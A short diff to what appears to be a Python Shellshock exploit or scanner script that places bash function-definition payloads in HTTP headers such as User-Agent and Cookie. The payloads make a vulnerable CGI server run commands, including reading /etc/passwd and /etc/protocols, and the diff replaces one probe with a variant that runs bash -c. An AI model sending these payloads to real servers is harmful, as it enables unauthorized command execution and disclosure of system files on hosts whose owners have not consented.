@@ -16,7 +16,7 @@ if (len(sys.argv)<=1) or (len(sys.argv)>2):
 1: list protocols from /etc/ on host
 '''
 payloads = {1:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/protocols',
-            2:'() { :;} ; echo busted',
+            2:'() { (a)=>\' bash -c "echo date"',
             3:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd',
            }
 http_headers = ['User-Agent', 'Referer', 'Cookie', 'Host']
